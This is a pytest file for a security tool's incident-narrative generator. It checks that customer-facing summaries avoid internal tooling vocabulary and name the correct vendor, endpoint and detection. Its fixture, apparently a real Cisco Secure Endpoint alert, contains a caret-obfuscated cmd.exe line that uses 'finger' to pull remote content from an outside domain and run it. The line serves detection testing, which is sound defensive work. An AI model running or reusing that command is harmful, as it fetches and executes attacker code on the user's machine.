"""Narrative Contract Test — permanent lexicon guardrail across every
customer-facing narrative surface.

Operator directive (2026-08-01):

    The Narrative Engine is prohibited from describing how X-Lab
    performed the investigation. The subject of every paragraph must
    be the incident / endpoint / user / malware / attacker — never
    the tool.

This test enforces the contract at the SEAM every UI surface actually
reads from — i.e. the fields the frontend renders:

    * cio.summary.analyst_narrative        (Executive lens LEAD block)
    * cio.summary.executive                (Executive Summary card)
    * cio.summary.analyst                  (Analyst Report card)
    * cio.summary.technical                (Technical Report card)
    * cio.summary.attack_story             (Attack Story card)
    * cio.summary.report_sections.*        (Six-question analyst narrative)
    * cio.summary.customer_report.sections[*].body (Customer / Investigation Report)

Given the same real-world Cisco Secure Endpoint MDR payload the
operator screenshotted, this test walks every surface above and
asserts NONE of the following terms appears (case-insensitive):

    * pipeline
    * decoder
    * recursive decoder
    * verdict engine
    * graph builder
    * parser
    * codec
    * summary composer
    * generic json raised
    * # vendor=
    * cisco:amp:event
    * recovered content reaches out to file://
    * the underlying command resolved to

If any surface ever regresses, this test will fail — locking in the
architectural improvement.
"""
from __future__ import annotations

import json
import re
from typing import Iterable, List, Tuple

import pytest

from nivxforge.cim.fact_substrate import from_analysis_result
from nivxforge.investigation.builder import build_cio
from nivxforge.investigation.summary_composer import compose_summary


# ── The exact operator-provided Cisco Secure Endpoint MDR payload ───

WASABISEED_PAYLOAD = json.dumps({
    "_time": "2026-07-30T16:30:22.000+00:00",
    "action": "detect",
    "category": "Cloud IOC",
    "command_line_args": (
        "C:\\windows\\system32\\cmd.exe /c s^t^a^r^t  /min for /f delims=@ "
        "%\u0441 in (',f^^i^^n^^g^^e^^r TVJLctGEMd@homesreceplestud.com') do %\u0441"
    ),
    "conn_guid": "79ed08f3-9018-44d5-9f58-254a748e6b86",
    "console_link": "https://console.amp.cisco.com/computers/79ed08f3-9018-44d5-9f58-254a748e6b86/trajectory2",
    "customer": "ccm",
    "date": "2026-07-30 16:23:13 UTC",
    "descr": "Caret characters are often used to obfuscate scripting code",
    "detection": "W32.CaretCommandObfuscation.ioc",
    "event_title": "Suspicious Command Line Activity - W32.CaretCommandObfuscation.ioc",
    "file_disposition": "Clean",
    "file_hash": "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0",
    "file_name": "cmd.exe",
    "file_path": "file:///C%3A/windows/system32/cmd.exe",
    "id": "1161464290877918403",
    "mitre_tactics": ["TA0002 - Execution", "TA0005 - Defense Evasion"],
    "mitre_techniques": [
        "T1027 - Obfuscated Files or Information",
        "T1059 - Command and Scripting Interpreter",
    ],
    "parent_file_hash": "988A56D897915315EEF9CA679B3BC8ADFCECF5E227AEA99AAA1817620520E97E",
    "severity": "Medium",
    "src_data": [{"hostname": ["CCM-MJ0DR5T8"], "ip": ["172.17.60.74"]}],
    "src_host": "CCM-MJ0DR5T8",
    "src_ip": "172.17.60.74",
    "use_case": "mdr_fileless",
    "z_event_id": "36f9a6b004f67a67a1a03f9b67740863",
    "z_product": "Secure Endpoint",
    "containment": "isolated",
})


# ── Forbidden lexicon (operator-locked) ─────────────────────────────

_FORBIDDEN_WORDS: Tuple[str, ...] = (
    "pipeline",
    "recursive decoder",
    "decoder",
    "verdict engine",
    "graph builder",
    "parser",
    "codec",
    "summary composer",
    "operation history",
    "decoder pass",
    "decode chain",
    "layer count",
    "normaliser",
    "normalizer",
)

# Phrases that are more specific than a single word — banned as
# regexes so the invariant catches the operator's exact screenshot
# regressions.
_FORBIDDEN_PHRASES: Tuple[str, ...] = (
    r"\bgeneric\s+json\s+raised\b",
    r"#\s*vendor\s*=",
    r"\bcisco:amp:event\b",
    r"recovered\s+content\s+reaches\s+out\s+to\s+file://",
    r"the\s+underlying\s+command\s+resolved\s+to",
    r"the\s+recursive\s+encoding\s+demonstrates",  # legacy composer
    r"the\s+investigation\s+routed",
    r"after\s+\d+\s+decoder\s+passes",
)


# ── Fixture: build a real CIO end-to-end, exactly like the router ──

@pytest.fixture(scope="module")
def wasabiseed_summary():
    """Build a full CIO + Summary using the same builders the
    /api/decode/smart router uses. The `raw_input` is stashed on
    metadata so the Incident Narrative Engine kicks in — exactly as
    it does in production."""
    fake_result = {
        "output": WASABISEED_PAYLOAD,
        "iocs": {},
        "engine": "test",
    }
    cio_fs = from_analysis_result(
        fake_result,
        input_text=WASABISEED_PAYLOAD,
        source_endpoint="/api/decode/smart",
    )
    cio = build_cio(cio_fs)
    # This is what routers/ops.py does after `_build_cio` and BEFORE
    # exposing the CIO to any downstream reader.
    cio.metadata["raw_input"] = WASABISEED_PAYLOAD
    cio.metadata.pop("phase1_state", None)
    cio.metadata.pop("phase1_narrative", None)
    cio.summary = compose_summary(cio)
    return cio.summary


def _iter_narrative_surfaces(summary) -> Iterable[Tuple[str, str]]:
    """Yield (surface_name, body) tuples for every customer-facing
    narrative field the frontend can render."""
    if summary.analyst_narrative:
        yield ("summary.analyst_narrative", summary.analyst_narrative)
    if summary.executive:
        yield ("summary.executive", summary.executive)
    if summary.analyst:
        yield ("summary.analyst", summary.analyst)
    if summary.technical:
        yield ("summary.technical", summary.technical)
    if summary.attack_story:
        yield ("summary.attack_story", summary.attack_story)

    rs = summary.report_sections
    if rs is not None:
        for field_name in ("what_happened", "what_we_found",
                            "what_we_dont_know", "what_to_do"):
            body = getattr(rs, field_name, None)
            if body:
                yield (f"summary.report_sections.{field_name}", body)

    cr = summary.customer_report or {}
    for i, sec in enumerate(cr.get("sections") or []):
        title = sec.get("title") or f"section_{i}"
        body = sec.get("body") or ""
        if body:
            yield (f"summary.customer_report[{title}]", body)


# ── The contract ────────────────────────────────────────────────────

def test_narrative_contract_all_surfaces_free_of_forbidden_words(
    wasabiseed_summary,
):
    """No customer-facing narrative field may contain the banned
    implementation-detail vocabulary."""
    violations: List[str] = []
    for surface, body in _iter_narrative_surfaces(wasabiseed_summary):
        low = body.lower()
        for term in _FORBIDDEN_WORDS:
            # Word-boundary match so 'endpoint' etc. never trip
            # 'pipeline' etc.
            if re.search(rf"\b{re.escape(term)}\b", low):
                violations.append(
                    f"[{surface}] contains forbidden term "
                    f"'{term}':\n  ...{low[max(0, low.find(term)-40):low.find(term)+len(term)+40]}..."
                )
    assert not violations, (
        "narrative surfaces leaked forbidden implementation-detail terms:\n\n"
        + "\n\n".join(violations)
    )


def test_narrative_contract_no_vendor_canonical_bleed(wasabiseed_summary):
    """The `# vendor=Generic JSON event[0]…` canonical stream must
    never appear in any customer-facing surface."""
    violations: List[str] = []
    for surface, body in _iter_narrative_surfaces(wasabiseed_summary):
        for pattern in _FORBIDDEN_PHRASES:
            m = re.search(pattern, body, re.IGNORECASE)
            if m:
                start = max(0, m.start() - 40)
                end = min(len(body), m.end() + 40)
                violations.append(
                    f"[{surface}] contains forbidden phrase "
                    f"/{pattern}/ ⇒ '...{body[start:end]}...'"
                )
    assert not violations, (
        "narrative surfaces leaked forbidden phrases:\n\n"
        + "\n\n".join(violations)
    )


def test_narrative_contract_positive_facts_present(wasabiseed_summary):
    """Positive control · every surface that names an incident MUST
    mention the correct vendor, endpoint and detection somewhere in
    its combined body — proof that the graph reached the surface."""
    combined = "\n".join(
        body for _, body in _iter_narrative_surfaces(wasabiseed_summary)
    )
    # Vendor identified correctly (was `Generic JSON` in the regression)
    assert "Cisco Secure Endpoint" in combined, (
        "no surface names the correct vendor 'Cisco Secure Endpoint':\n"
        + combined[:1500]
    )
    # Endpoint identity from the graph
    assert "CCM-MJ0DR5T8" in combined
    # Detection name is preserved (subject-line, not paraphrased away)
    assert "W32.CaretCommandObfuscation.ioc" in combined
    # ATT&CK evidence is surfaced from `mitre_techniques`
    assert "T1027" in combined
    assert "T1059" in combined


def test_narrative_contract_subject_of_first_sentence_is_the_incident(
    wasabiseed_summary,
):
    """Every non-empty narrative surface's OPENING sentence must talk
    about the incident, endpoint, vendor, detection, malware, user,
    process chain, network activity, or timeline — NEVER the tool.

    The subject of the first sentence is the strongest tell for the
    reader; the operator's screenshot regressions all began with
    'The pipeline received…' or 'The submission triggered…'. This
    test locks that door."""
    bad_subjects = (
        "the pipeline",
        "the decoder",
        "the parser",
        "the analysis engine",
        "the summary composer",
        "the graph builder",
        "the investigation routed",
        "the decoded output",
        "the recursive decoder",
        "the recovered content",
        "the recovered command",
        "the recovered payload",
        "generic json raised",
        "the submission triggered",
    )
    violations: List[str] = []
    for surface, body in _iter_narrative_surfaces(wasabiseed_summary):
        first_sentence = body.strip().split(".", 1)[0].strip().lower()
        if not first_sentence:
            continue
        for bad in bad_subjects:
            if bad in first_sentence:
                violations.append(
                    f"[{surface}] first sentence starts with tool-subject "
                    f"'{bad}':\n  '{first_sentence[:200]}'"
                )
    assert not violations, (
        "narrative surfaces open with tool as the subject:\n\n"
        + "\n\n".join(violations)
    )
